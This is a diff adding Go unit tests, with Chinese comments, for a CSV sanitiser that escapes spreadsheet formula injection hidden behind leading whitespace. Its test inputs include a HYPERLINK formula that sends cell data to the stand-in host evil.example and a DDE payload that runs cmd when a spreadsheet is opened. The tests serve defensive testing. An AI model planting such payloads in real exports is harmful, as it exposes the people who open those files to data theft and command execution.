@@ -47,6 +47,56 @@ func TestCSVSafeEscapesFormulaPrefixes(t *testing.T) {
 	}
 }
 
+// TestCSVSafeEscapesWhitespacePaddedFormulas 锁死「前导空白绕过」这条捷径。
+//
+// 表格软件在判断某格是否为公式时，同样会忽略前导空白。于是攻击者只需在
+// 载荷前面垫一个空格或 Tab —— " =HYPERLINK(...)" —— 就既能骗过只看 s[0]
+// 的防护，又能在打开时照样被求值。判定必须先剥空白再看来头字符。
+func TestCSVSafeEscapesWhitespacePaddedFormulas(t *testing.T) {
+	cases := []struct {
+		name string
+		in   string
+		want string
+	}{
+		{"空格垫在等号前", " =1+1", "' =1+1"},
+		{"多个空格", "   =1+1", "'   =1+1"},
+		{"Tab 垫在等号前", "\t=1+1", "'\t=1+1"},
+		{"空格+Tab 混合", " \t=1+1", "' \t=1+1"},
+		{"空格垫在加号前", " +1234", "' +1234"},
+		{"空格垫在 at 前", " @SUM(A1:A9)", "' @SUM(A1:A9)"},
+		{
+			"空格垫在 HYPERLINK 前",
+			` =HYPERLINK("http://evil.example/?x="&A1,"点我")`,
+			`' =HYPERLINK("http://evil.example/?x="&A1,"点我")`,
+		},
+		// DDE 载荷的经典写法就是先垫空白再给减号，
+		// 剥掉空白后它不是数字，因此必须转义。
+		{"空格垫在 DDE 载荷前", " -2+3+cmd|'/c calc'!A0", "' -2+3+cmd|'/c calc'!A0"},
+		{"换页符垫在等号前", "\f=1+1", "'\f=1+1"},
+		{"垂直制表符垫在等号前", "\v=1+1", "'\v=1+1"},
+	}
+
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			if got := CSVSafe(tc.in); got != tc.want {
+				t.Errorf("CSVSafe(%q) = %q, 期望 %q", tc.in, got, tc.want)
+			}
+		})
+	}
+}
+
+// TestCSVSafeKeepsPaddedNegativeNumbersNumeric 前导空白的负数仍要当数字放行。
+//
+// 剥空白是为了判首字符，不是为了改数据 —— " -5" 必须保持数字语义，
+// 否则仓库里但凡有人在数量前多敲一个空格，导出后求和就全错了。
+func TestCSVSafeKeepsPaddedNegativeNumbersNumeric(t *testing.T) {
+	for _, s := range []string{" -5", "  -5.25", "\t-0.5"} {
+		if got := CSVSafe(s); got != s {
+			t.Errorf("CSVSafe(%q) = %q, 期望原样保留（带空白的负数不应被转成文本）", s, got)
+		}
+	}
+}
+
 // TestCSVSafeKeepsNegativeNumbersNumeric 确认负数**不会**被转义。
 //
 // 这是本函数最容易写错的地方：`-` 既是公式前缀，也是负号。
